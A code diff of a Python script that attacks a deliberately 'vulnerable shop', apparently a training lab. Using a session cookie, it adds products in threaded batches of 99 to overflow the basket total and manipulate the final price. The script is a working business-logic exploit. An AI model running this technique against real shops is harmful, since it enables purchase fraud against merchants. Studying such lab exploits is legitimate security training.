@@ -11,7 +11,8 @@ cookie = "q0FFTtYvfXhs7s0MjbYWGJhE6k9Y8SkV"
 # prod_id and prod_price are related to different product choose from the vulnerable shop. Pick one which the highest lower than $100
 prod_id = 8  # set up this to id of the product that costs lower than $100
 prod_price = "92.76"  # set up to product cost
-
+#quantity of product that can be added to basket
+quantity = 99
 
 previous_price = 0
 
@@ -31,8 +32,6 @@ def check_price():
                "Sec-Fetch-User": "?1",
                "Te": "trailers"}
     r = requests.get(url, headers=headers, cookies=cookies)
-    # am not sure if the return is valid
-    # final_price = int(re.search('Total:</th>\n<th>(.+?)</th>', r.text).group(1).replace('$', '').strip()[:-3])
     final_price = get_price(r.text)
     print(f"Actual price: ${final_price}", end='\r')
     return final_price
@@ -78,14 +77,12 @@ def add_item_async(quantity, prod_id):
 def up_the_price(price):
     single_prod_price = float("92.76")
     prod_quantity = int(abs(price / single_prod_price))
-    # print(price)
-    # print(prod_quantity)
-    # exit()
     i = 0
+    
     while i < prod_quantity + 1:
         diff = prod_quantity + 1 - i
         if (diff >= 100):
-            i = i + 99
+            i = i + quantity
             t = threading.Thread(target=add_item_async, args=(99, prod_id, ))
             t.start()
             threads.append(t)
@@ -94,9 +91,7 @@ def up_the_price(price):
 
     for t in threads:
         t.join()
-
-
-quantity = 99
+        
 
 while True:
     new_price = check_price()
